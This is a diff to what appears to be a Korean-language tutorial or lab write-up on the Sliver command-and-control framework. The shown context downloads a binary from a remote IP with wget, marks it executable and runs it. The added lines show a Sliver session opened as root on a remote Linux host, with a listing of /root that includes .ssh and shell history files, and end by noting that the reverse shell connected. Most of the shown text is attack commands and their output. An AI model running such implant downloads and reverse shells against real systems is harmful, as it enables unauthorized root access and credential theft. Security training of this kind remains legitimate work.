@@ -35,3 +35,38 @@ wget http://54.180.117.219:8443/test
 chmod +x ./test
 ./test
 ```
+<br>
+
+```bash
+sliver > sessions
+
+ ID         Transport   Remote Address     Hostname         Username   Operating System   Health  
+========== =========== ================== ================ ========== ================== =========
+ 48df96c2   http(s)     3.39.22.14:41256   ip-172-31-45-3   root       linux/amd64        [ALIVE] 
+
+sliver > sessions -i 48df96c2
+
+[*] Active session ENTHUSIASTIC_APPEAL (48df96c2)
+
+sliver (ENTHUSIASTIC_APPEAL) > whoami
+
+Logon ID: root
+
+sliver (ENTHUSIASTIC_APPEAL) > ls
+
+/root (10 items, 15.0 MiB)
+==========================
+-rw-------  root:root  .bash_history   4.6 KiB   Sat Mar 29 16:02:16 +0000 2025
+-rw-r--r--  root:root  .bashrc         3.0 KiB   Mon Apr 22 13:04:27 +0000 2024
+-rw-------  root:root  .lesshst        20 B      Fri Mar 28 13:50:41 +0000 2025
+-rw-------  root:root  .mysql_history  1.8 KiB   Sat Mar 29 09:24:45 +0000 2025
+-rw-r--r--  root:root  .profile        161 B     Mon Apr 22 13:04:27 +0000 2024
+drwx------  root:root  .ssh            <dir>     Tue Mar 18 13:17:57 +0000 2025
+-rw-------  root:root  .viminfo        13.3 KiB  Sat Mar 29 09:15:21 +0000 2025
+-rw-r--r--  root:root  .wget-hsts      209 B     Tue Mar 18 13:37:30 +0000 2025
+drwx------  root:root  snap            <dir>     Tue Mar 18 13:18:02 +0000 2025
+-rwxr-xr-x  root:root  test            15.0 MiB  Sun Mar 30 07:37:33 +0000 2025
+```
+<br>
+
+Reverse Shell이 잘 연결됨을 확인할 수 있습니다.
